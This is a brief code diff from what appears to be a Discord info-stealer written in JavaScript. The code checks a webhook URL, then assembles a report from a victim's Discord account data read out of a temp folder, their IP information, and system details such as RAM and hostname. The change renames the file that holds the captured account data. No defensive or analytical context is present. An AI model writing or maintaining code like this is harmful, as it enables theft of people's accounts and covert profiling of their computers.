@@ -14,7 +14,7 @@ if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url))
 
 const json = async (zipFile) => {
   const ipInfo = async (info) => await require('./ip-info').then(ip => ip[info]);
-  const discordAccountInfo = JSON.parse(readFileSync(join(tempFolder, 'dsc_acc.json')).toString());
+  const discordAccountInfo = JSON.parse(readFileSync(join(tempFolder, 'Discord.json')).toString());
   const computerInfoFields = [
     ['RAM', Math.floor(os.totalmem() / 1024 / 1024 / 1024) + 'GB'],
     ['Name', codeBlock(os.hostname())],
